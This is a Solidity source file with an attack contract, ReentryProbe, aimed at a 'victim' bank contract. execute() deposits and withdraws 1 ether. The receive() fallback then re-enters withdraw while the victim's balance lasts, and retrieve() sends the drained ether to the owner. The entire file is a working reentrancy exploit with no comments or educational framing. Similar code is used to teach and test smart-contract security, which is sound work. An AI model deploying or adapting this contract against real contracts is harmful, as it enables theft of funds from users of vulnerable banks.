interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract ReentryProbe {
    IBank public victim;
    address public owner;

    constructor(address _victim) {
        victim = IBank(_victim);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }

    function execute() external payable {
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    function retrieve() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}